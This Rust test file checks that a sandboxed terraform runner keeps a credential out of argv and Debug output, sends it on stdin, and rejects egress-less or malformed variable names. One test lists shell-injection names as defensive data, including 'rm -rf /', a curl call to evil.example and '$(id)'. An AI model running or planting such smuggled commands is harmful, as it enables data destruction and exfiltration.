//! Option A: a credential in the box, and the limits of what that buys.
//!
//! The threat model (#17) settled that a credential inside the box is
//! defensible when nothing third-party runs there, and that the wall
//! bounds **reach, not authority** — the box can do whatever the
//! credential permits at an endpoint the grant allows. These tests pin
//! the parts that are enforceable, which is a smaller set than a reader
//! might assume:
//!
//! - the value never reaches `argv`, because `ps` is readable by other
//!   users on a shared host;
//! - a credential with no egress to spend it at is refused, because the
//!   allowlist is the only thing bounding where it goes;
//! - the interpolated name cannot carry anything but a name.
//!
//! What they cannot pin is the thing option B would have bought: once
//! the box holds the token, nothing here constrains *which* calls it
//! makes at an allowed endpoint.

use lex_iac::apply::{apply_argv_with_credential, BoxSpec, Credential, CredentialError};

/// A distinct name per test: the environment is process-wide, and tests
/// share a process.
fn set(name: &str, value: &str) {
    // SAFETY: single-threaded per test body, and each test uses a name
    // no other test touches.
    unsafe { std::env::set_var(name, value) };
}

fn egress() -> Vec<String> {
    vec!["api.hetzner.cloud:443".to_string()]
}

#[test]
fn a_credential_is_read_from_the_environment_not_the_command_line() {
    set("LEX_IAC_TEST_TOKEN_A", "s3cr3t-token-value");
    let c = Credential::from_env("LEX_IAC_TEST_TOKEN_A", &egress()).expect("should read");

    let argv = apply_argv_with_credential(&BoxSpec::default(), "m.json", None, None, Some(&c));

    // The whole argv, joined, must not contain the secret anywhere — not
    // in the command, not in a flag, not in the shell snippet.
    let joined = argv.join(" ");
    assert!(
        !joined.contains("s3cr3t-token-value"),
        "the token reached argv, where `ps` would show it to every user on the host:\n{joined}"
    );
    // It does name the variable, because the guest has to export it.
    assert!(joined.contains("LEX_IAC_TEST_TOKEN_A"), "{joined}");
}

#[test]
fn the_value_travels_on_stdin_as_one_line() {
    set("LEX_IAC_TEST_TOKEN_B", "abc123");
    let c = Credential::from_env("LEX_IAC_TEST_TOKEN_B", &egress()).unwrap();
    assert_eq!(c.stdin_line(), "abc123\n");
}

/// A `{:?}` added to a log line months from now must not be the thing
/// that leaks it.
#[test]
fn debug_never_prints_the_value() {
    set("LEX_IAC_TEST_TOKEN_C", "do-not-print-me");
    let c = Credential::from_env("LEX_IAC_TEST_TOKEN_C", &egress()).unwrap();
    let shown = format!("{c:?}");
    assert!(!shown.contains("do-not-print-me"), "{shown}");
    assert!(shown.contains("redacted"), "{shown}");
}

/// The wall bounds reach. With no egress there is no reach to bound, so
/// the credential would be a secret in a box for no reason — and the
/// declaration that would have said where it may be spent is missing.
#[test]
fn a_credential_with_nowhere_to_go_is_refused() {
    set("LEX_IAC_TEST_TOKEN_D", "x");
    // `matches!` rather than `assert_eq!`: `Credential` deliberately
    // does not implement `PartialEq`, so a secret cannot be compared
    // with `==` out of habit.
    assert!(matches!(
        Credential::from_env("LEX_IAC_TEST_TOKEN_D", &[]),
        Err(CredentialError::NoEgress)
    ));
}

/// Absent and empty are the same answer: there is nothing to fall back
/// to, and guessing would mean booting a box with no credential and
/// finding out from terraform.
#[test]
fn an_unset_or_empty_variable_is_refused() {
    assert!(matches!(
        Credential::from_env("LEX_IAC_TEST_TOKEN_NEVER_SET", &egress()),
        Err(CredentialError::Absent(_))
    ));
    set("LEX_IAC_TEST_TOKEN_E", "");
    assert!(matches!(
        Credential::from_env("LEX_IAC_TEST_TOKEN_E", &egress()),
        Err(CredentialError::Absent(_))
    ));
}

/// The name is interpolated into a shell command, so it is held to a
/// shape that cannot carry anything else. This is the test that would
/// fail if someone widened the check.
#[test]
fn a_name_that_could_carry_a_command_is_refused() {
    for bad in [
        "TOKEN; rm -rf /",
        "TOKEN\"; curl evil.example #",
        "TOKEN$(id)",
        "TOKEN`id`",
        "TOKEN VALUE",
        "TOKEN\nVALUE",
        "1TOKEN",
        "",
    ] {
        assert!(
            matches!(
                Credential::from_env(bad, &egress()),
                Err(CredentialError::BadName(_))
            ),
            "`{bad}` was accepted as an environment variable name"
        );
    }
}

#[test]
fn an_ordinary_name_is_accepted() {
    for good in ["HCLOUD_TOKEN", "AWS_SESSION_TOKEN", "_X", "A1"] {
        set(good, "v");
        assert!(
            Credential::from_env(good, &egress()).is_ok(),
            "`{good}` should be a usable name"
        );
    }
}

/// Without a credential the command is exactly what it was: no shell,
/// no quoting layer. Adding the credential path must not have changed
/// the ordinary one.
#[test]
fn the_no_credential_command_still_bypasses_the_shell() {
    let argv = apply_argv_with_credential(&BoxSpec::default(), "m.json", None, None, None);
    assert!(
        !argv.iter().any(|a| a == "/bin/sh"),
        "the credential-free path must not gain a shell: {argv:?}"
    );
    assert!(argv.iter().any(|a| a == "/usr/bin/terraform"));
}

/// And with one, the shell snippet is a constant shape: it reads a
/// single line, exports under the given name, and execs terraform.
#[test]
fn the_credential_command_reads_one_line_and_execs() {
    set("LEX_IAC_TEST_TOKEN_F", "v");
    let c = Credential::from_env("LEX_IAC_TEST_TOKEN_F", &egress()).unwrap();
    let argv = apply_argv_with_credential(&BoxSpec::default(), "m.json", None, None, Some(&c));

    let script = argv.last().expect("a script");
    assert!(script.starts_with("read -r "), "{script}");
    assert!(script.contains("exec /usr/bin/terraform"), "{script}");
    assert!(
        script.contains("unset __lex_iac_cred"),
        "the token must not be left in a second variable: {script}"
    );
}
